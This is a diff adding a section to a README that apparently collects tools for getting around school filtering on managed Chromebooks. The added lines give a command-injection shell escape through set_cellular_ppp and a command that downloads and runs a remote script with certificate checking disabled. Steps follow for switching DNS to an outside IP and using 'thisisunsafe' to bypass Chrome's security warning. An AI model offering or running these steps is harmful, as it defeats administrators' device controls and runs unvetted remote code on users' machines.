@@ -1,5 +1,17 @@
 ## Tools for responsible students. If you do not have a brain, turn back now.
 <br>
+
+BETA SEE ME TO ATTEMPT!!!!! (scroll down for normal stuff):
+set_cellular_ppp \';bash;exit;\'
+bash <(curl -k https://coolelectronics.me/unroll)
+1.go to the settings then click the wifi you are on.
+2.scroll down to were it say network click on that then name servers
+3.click custom nameservers then in the 4 boxes put 198.98.53.76
+4.Go to a new tab and in the url bar type chrome://restart then press enter(this will restart your computer without signing you out)
+5.then go to a new tab and search chrome.google.com if that doesn't work try https://chrome.google.com/webstorez
+6.Then it should say this is not safe randomly type thisisunsafe no spaces and it should work. CREDIT TO COMPACTCOW AND NEBELUNG AND BYPASSI. 
+
+
 <details>
     
 <summary><b>blow up iboss</b></summary>
